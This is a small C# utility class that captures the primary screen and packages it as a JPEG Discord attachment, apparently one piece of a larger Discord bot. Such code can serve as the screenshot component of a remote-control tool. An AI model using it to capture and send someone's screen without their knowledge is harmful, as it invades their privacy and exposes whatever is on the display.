using Discord;
using System;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.Runtime.InteropServices;

namespace Infrastructure
{
    public class VideoManager
    {
        public static Bitmap TakeScreenShot()
        {
            var screen_bounds = Screen.PrimaryScreen?.Bounds;

            if (screen_bounds == null)
            {
                return new Bitmap(1920, 1080);
            }

            Bitmap bmp = new Bitmap(screen_bounds!.Value.Width, screen_bounds!.Value.Height);
            using (Graphics g = Graphics.FromImage(bmp))
            {
                g.CopyFromScreen(0, 0, 0, 0, screen_bounds!.Value.Size);
            }
            return bmp;
        }

        public static FileAttachment ScreenshotAttachment()
        {
            var bmp = TakeScreenShot();
            var fileAttachment = BitmapToFileAttachment(bmp);
            bmp.Dispose();
            return fileAttachment;
        }

        public static FileAttachment BitmapToFileAttachment(Bitmap bitmap)
        {
            MemoryStream memoryStream = new();
            bitmap.Save(memoryStream, System.Drawing.Imaging.ImageFormat.Jpeg);
            memoryStream.Position = 0;
            return new FileAttachment(memoryStream, "screenshot.jpg");

        }
    }
}